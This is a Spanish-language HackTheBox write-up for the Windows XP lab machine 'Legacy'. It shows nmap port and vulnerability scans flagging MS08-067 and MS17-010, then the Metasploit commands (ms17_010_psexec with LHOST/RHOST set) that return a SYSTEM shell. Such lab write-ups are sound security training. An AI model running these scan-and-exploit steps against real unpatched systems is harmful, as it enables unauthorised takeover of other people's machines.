---
icon: windows
tags:
  - eternal-blue
  - metasploit
---

# Legacy

## Resumen

### Detalles

| Campo                 | Detalle        |
| --------------------- | -------------- |
| **Nombre**            | Legacy         |
| **Sistema Operativo** | Windows        |
| **Plataforma**        | HackTheBox     |
| **Fecha**             | 03/11/2026     |
| **IP Objetivo**       | 10.129.227.181 |

### Executive Summary

**Legacy** es una máquina **Windows XP** de HackTheBox. Al hacer el escaneo se detectaron los puertos **135 (MSRPC)**, **139 (NetBIOS)** y **445 (SMB)**. La enumeración SMB con null auth y guest no funcionó, así que se procedió directamente a lanzar el scan de vulnerabilidades con Nmap, que marcó el host como vulnerable a **MS08-067** y, sobre todo, a **MS17-010 (EternalBlue)**.

Se exploto mediante Metasploit con el módulo `exploit/windows/smb/ms17_010_psexec`, se obtuvo una shell con privilegios de **administrador/SYSTEM** sin necesidad de escalar.

### Técnicas

* Eternalblue Exploitation (MS17-010) through Metasploit

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.181 -oG allPorts
> nmap -sCV -p135,139,445 -Pn -n -vv 10.129.227.181 -oG allServices
```

```
PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16915/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18103/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60321/udp): CLEAN (Failed to receive data)
|   Check 4 (port 18702/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:05:ea:15 (unknown)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   a2:de:ad:05:ea:15:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m51s, median: 4d23h57m38s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-11-08T21:51:48+02:00
```

| Puerto  | Servicio     | Versión                       |
| ------- | ------------ | ----------------------------- |
| 135/tcp | msrpc        | Microsoft Windows RPC         |
| 139/tcp | netbios-ssn  | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | Windows XP microsoft-ds       |

### Enumeration

#### SMB

No fue posible la enumeración con Null Auth ni con Guest.

## Explotación

### Foothold

Se realizó un scanneo de vulnerabilidades con nmap.

```bash
> nmap --script "vuln" -vv -Pn -n -p135,139,445 10.129.227.181
```

```
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
```

* **Vulnerabilidad:** SMB Remote Code Execution
* **Exploit:** Eternal Blue (Metasploit - `windows/smb/ms17_010_psexec`)
* **Procedimiento:**

1. Se inicializa `msfconsole`

```bash
> msfconsole

> use exploit/windows/smb/ms17_010_psexec
> set LHOST 10.10.14.108
> set RHOST 10.129.227.181
> run
```

<figure><img src="../../../.gitbook/assets/unknown (17).png" alt=""><figcaption></figcaption></figure>

Se obtiene shell con privilegios de administrador directamente ![](<../../../.gitbook/assets/unknown (18).png>)

* **Evidencia:** (`user.txt` & `root.txt`)

<figure><img src="../../../.gitbook/assets/unknown (19).png" alt=""><figcaption></figcaption></figure>
